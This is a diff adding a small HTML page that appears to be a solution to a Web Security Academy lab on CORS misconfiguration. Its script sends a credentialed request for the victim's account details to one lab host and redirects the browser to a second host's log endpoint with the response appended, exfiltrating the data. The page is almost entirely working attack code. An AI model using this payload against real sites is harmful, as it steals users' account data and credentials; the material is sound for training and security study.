@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    Hello redirect!
+
+    
+    <script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://ac851f7d1e8838be805f677d00b10029.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {location='https://ac141f8b1ec0381680d667e401550079.web-security-academy.net//log?key='+this.responseText;
+    };
+    </script>
+
+
+
+</body>
+</html> 
